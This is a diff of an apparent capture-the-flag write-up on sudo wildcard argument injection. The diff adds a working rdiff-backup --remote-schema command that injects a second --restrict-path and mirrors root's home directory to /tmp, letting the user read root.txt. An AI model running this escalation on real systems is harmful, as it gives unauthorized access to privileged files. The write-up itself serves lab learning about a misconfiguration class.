@@ -256,21 +256,25 @@ the `[[USER@]SERVER::]PATH` syntax:
 no SSH needed -  `::` with no hostname spawns the server locally.
 
 ---
+
 #### the vulnerability
 
 **argparse last-value-wins.**
 
 `--restrict-path` only accepts one value. when you pass it twice, argparse silently takes the last one and discards the first.
 
-the sudo rule hardcodes `--restrict-path /opt/backup` -  but the `*` wildcard lets owen inject a second `--restrict-path` which **overwrites** the first.
+the sudo rule hardcodes `--restrict-path /opt/backup` — but the `*` wildcard lets owen inject a second `--restrict-path` which **overwrites** the first.
 
 ---
+
 #### the exploit
 
 bash
 
 ```bash
-****
+rdiff-backup --remote-schema \
+  'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' \
+  backup /::/root /tmp/rootbak
 ```
 
 what actually runs as root:
@@ -284,7 +288,7 @@ sudo /usr/bin/rdiff-backup --server \
   --restrict-path /root           # ← injected via %s (wins)
 ```
 
-result: server is now restricted to `/root` instead of `/opt/backup` — reads root's entire home directory and mirrors it to `/tmp/rootbak`.
+result: server is now restricted to `/root` instead of `/opt/backup` - reads root's entire home directory and mirrors it to `/tmp/rootbak`.
 
 bash
 
@@ -296,7 +300,7 @@ cat /tmp/rootbak/root.txt  # gg
 
 #### vulnerability class
 
-**Sudo wildcard argument injection** — the `*` in a sudo rule allows appending arbitrary flags, including ones that override security restrictions already defined in the rule.
+**Sudo wildcard argument injection** - the `*` in a sudo rule allows appending arbitrary flags, including ones that override security restrictions already defined in the rule.
 
 ---
 
@@ -312,8 +316,4 @@ cat /tmp/rootbak/root.txt  # gg
 cat /root/root.txt
 ```
 
-## Lessons Learned
 
-1. Key takeaway one
-2. Key takeaway two
-3. Key takeaway three
